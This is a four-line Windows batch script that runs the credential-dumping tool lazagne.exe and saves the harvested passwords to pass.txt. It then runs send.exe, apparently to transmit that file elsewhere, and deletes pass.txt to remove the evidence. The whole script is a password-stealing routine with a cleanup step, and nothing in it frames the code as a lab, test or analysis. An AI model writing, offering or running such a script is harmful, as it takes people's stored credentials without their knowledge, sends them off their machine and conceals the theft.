@echo off
lazagne.exe > pass.txt
send.exe
del /s "pass.txt"